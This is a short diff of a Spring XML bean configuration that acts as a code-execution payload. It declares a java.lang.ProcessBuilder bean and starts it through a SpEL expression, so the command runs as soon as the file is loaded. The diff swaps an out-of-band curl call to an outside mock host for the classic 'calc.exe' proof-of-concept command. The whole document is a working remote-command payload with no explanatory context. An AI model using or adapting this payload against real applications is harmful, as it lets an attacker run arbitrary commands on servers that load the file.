@@ -5,7 +5,7 @@
      http://www.springframework.org/schema/beans/spring-beans.xsd
 ">
   <bean id="pb" class="java.lang.ProcessBuilder">
-     <constructor-arg value="curl https://02da3bf3-0eee-4e75-bc61-034d58fab186.mock.pstmn.io" />
+     <constructor-arg value="calc.exe" />
      <property name="whatever" value="#{ pb.start() }"/>
   </bean>
 </beans>
